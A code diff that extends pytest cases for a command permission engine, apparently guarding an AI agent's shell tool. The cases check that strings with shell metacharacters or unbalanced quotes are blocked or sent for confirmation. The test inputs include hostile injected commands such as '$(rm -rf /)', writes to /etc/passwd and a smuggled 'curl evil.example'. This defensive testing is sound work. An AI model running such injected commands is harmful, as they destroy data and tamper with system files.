@@ -65,6 +65,13 @@ def test_write_file_confirm(engine: PermissionEngine) -> None:
         "git status $(rm -rf /)",
         "git status > /etc/passwd",
         "git status\nrm -rf /",
+        "git status < /etc/passwd",
+        "git status {foo}",
+        "git status \\",
+        "git status\rcurl evil.example",
+        "git status %errorlevel%",
+        "git status !cd!",
+        "git status \x00extra",
     ],
 )
 def test_shell_metacharacters_block_wildcard_allow(command: str) -> None:
@@ -100,11 +107,17 @@ def test_plain_command_without_metacharacters_still_allowed() -> None:
     assert engine.evaluate("RunCommand:git status") == PermissionLevel.ALLOW
 
 
-def test_unbalanced_quotes_force_confirm() -> None:
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git commit -m 'unterminated",
+        'git commit -m "unterminated',
+        "git commit -m 'mismatched\"",
+        'git commit -m "bad\\',
+    ],
+)
+def test_unbalanced_quotes_force_confirm(command: str) -> None:
     """Commands shlex cannot tokenize are treated as suspicious."""
     rules = PermissionRulesConfig(allow={"RunCommand:git *"})
     engine = PermissionEngine(rules)
-    assert (
-        engine.evaluate("RunCommand:git commit -m 'unterminated")
-        == PermissionLevel.CONFIRM
-    )
+    assert engine.evaluate(f"RunCommand:{command}") == PermissionLevel.CONFIRM
